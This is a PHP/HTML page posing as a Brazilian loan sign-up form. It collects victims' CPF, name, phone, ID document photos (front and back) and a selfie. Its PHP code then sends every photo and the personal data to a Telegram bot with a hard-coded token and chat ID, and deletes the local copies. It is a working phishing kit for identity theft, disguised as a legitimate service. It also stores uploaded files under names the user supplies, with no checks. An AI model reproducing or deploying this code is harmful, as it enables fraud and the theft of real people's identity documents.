<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" href="style.css">
    <title>Credit Emprestimos</title>
</head>

<body>
    <div class="box">
        <div class="img-box">
            <img src="img-formulario.png">
        </div>
        <div class="form-box">
            <h2>Cred$ | Cadastro</h2>
            <p>empréstimos</p>
            
            <form class="enviarrg" action="" method="post" enctype="multipart/form-data">
                <div class="input-group">
                    <label for="nome"> CPF</label>
                    <input class="cpf" oninput="mascara(this)" type="text" id="nome" placeholder="Digite o seu CPF" name='cpf' required>
                </div>

                <div class="input-group">
                    <label for="email">Nome completo</label>
                    <input class="nome" type="text" id="email" placeholder="Digite o seu Nome" name='nome' required>
                </div>

                <div class="input-group">
                    <label for="telefone">Telefone</label>
                    <input class="telefone" type="tel" id="telefone" placeholder="Digite o seu telefone" name='telefone' required>
                </div>


                
                <label>Documento (RG OU CNH) / Uma selfie sua : </label>
                <div class="divisaof">

                    <label class="rgfrente" for="arquivo">Frente
                    <input type="file" name="arquivo" id="arquivo" required="true">
					</label>

                    <label class="rgfrent" for="arquivo">Verso
                    <input type="file" name="arquivov" id="arquivo" required="true">
					</label>

                    <label class="rgfren" for="arquivo">Selfie
                    <input type="file" name="arquivos" id="arquivo" required="true">
					</label>
                </div>

                <div id="img-container">
                    <img id="preview" src="">
                </div>
              

                <div class="input-group" name="acao">
                    <button onclick="alertar()">Cadastrar</button>
                </div>
        
                
                



                

            </form>
        </div>
    </div>
</body>

<script>
    function mascara(i){
   
   var v = i.value;
   
   if(isNaN(v[v.length-1])){ // impede entrar outro caractere que não seja número
      i.value = v.substring(0, v.length-1);
      return;
   }
   
   i.setAttribute("maxlength", "14");
   if (v.length == 3 || v.length == 7) i.value += ".";
   if (v.length == 11) i.value += "-";

}

function alertar(){
    alert("Enviando Credenciais...");
}

</script>
</html>

<?php











if(isset($_FILES['arquivo'])){
    $arquivo = $_FILES['arquivo'];
    $arquivoNovo = explode('.',$arquivo['name']);
    move_uploaded_file($arquivo['tmp_name'],'banco/'.$arquivo['name']);


}
if(isset($_FILES['arquivov'])){
    $arquivov = $_FILES['arquivov'];
    $arquivoNovo = explode('.',$arquivov['name']);
    move_uploaded_file($arquivov['tmp_name'],'banco/'.$arquivov['name']);

}
if(isset($_FILES['arquivos'])){
    $arquivos = $_FILES['arquivos'];
    $arquivoNovo = explode('.',$arquivos['name']);
    move_uploaded_file($arquivos['tmp_name'],'banco/'.$arquivos['name']);

}

$chat_id = '1229660024';

if(isset($_FILES['arquivo'])){
    $cpf = $_POST['cpf'];
    $nomeCompleto = $_POST['nome'];
    $tel = $_POST['telefone'];

    $mensagem = 
    $nomeCompleto."  |  ".
    $cpf."  |  ".
    $tel;
    
    $bot_url    = "https://api.telegram.org/bot5498433213:AAE97Babg2Q0bTYv_6n0Ga-7cnEq0a2qRtc/";
    $url        = $bot_url . "sendPhoto?chat_id=" . $chat_id ;

    $post_fields = array('chat_id'   => $chat_id,
        'photo'     => new CURLFile(realpath("banco/".$arquivo['name'])),
    );

    $ch = curl_init(); 
    curl_setopt($ch, CURLOPT_HTTPHEADER, array(
        "Content-Type:multipart/form-data"
    ));
    curl_setopt($ch, CURLOPT_URL, $url); 
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1); 
    curl_setopt($ch, CURLOPT_POSTFIELDS, $post_fields); 

    
    $output = curl_exec($ch);
    unlink('banco/'.$arquivo['name']);


    





    $bot_url    = "https://api.telegram.org/bot5498433213:AAE97Babg2Q0bTYv_6n0Ga-7cnEq0a2qRtc/";
    $url        = $bot_url . "sendPhoto?chat_id=" . $chat_id ;

    $post_fields = array('chat_id'   => $chat_id,
        'photo'     => new CURLFile(realpath("banco/".$arquivov['name']))
    );

    $ch = curl_init(); 
    curl_setopt($ch, CURLOPT_HTTPHEADER, array(
        "Content-Type:multipart/form-data"
    ));
    curl_setopt($ch, CURLOPT_URL, $url); 
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1); 
    curl_setopt($ch, CURLOPT_POSTFIELDS, $post_fields); 

    
    $output = curl_exec($ch);
    unlink('banco/'.$arquivov['name']);








    $bot_url    = "https://api.telegram.org/bot5498433213:AAE97Babg2Q0bTYv_6n0Ga-7cnEq0a2qRtc/";
    $url        = $bot_url . "sendPhoto?chat_id=" . $chat_id ;

    $post_fields = array('chat_id'   => $chat_id,
        'photo'     => new CURLFile(realpath("banco/".$arquivos['name'])),
    );

    $ch = curl_init(); 
    curl_setopt($ch, CURLOPT_HTTPHEADER, array(
        "Content-Type:multipart/form-data"
    ));
    curl_setopt($ch, CURLOPT_URL, $url); 
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1); 
    curl_setopt($ch, CURLOPT_POSTFIELDS, $post_fields); 

    
    $output = curl_exec($ch);
    unlink('banco/'.$arquivos['name']);




    $bot_url    = "https://api.telegram.org/bot5498433213:AAE97Babg2Q0bTYv_6n0Ga-7cnEq0a2qRtc/";
    $url        = $bot_url . "sendMessage?chat_id=" . $chat_id ;

    $post_fields = array('chat_id'   => $chat_id,
        'text'     => $mensagem
    );

    $ch = curl_init(); 
    curl_setopt($ch, CURLOPT_URL, $url); 
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1); 
    curl_setopt($ch, CURLOPT_POSTFIELDS, $post_fields); 

    
    $output = curl_exec($ch);


    echo "<script>alert('Cadastro concluido entraremos em contato pelo WhatsApp');</script>";
   
}

?>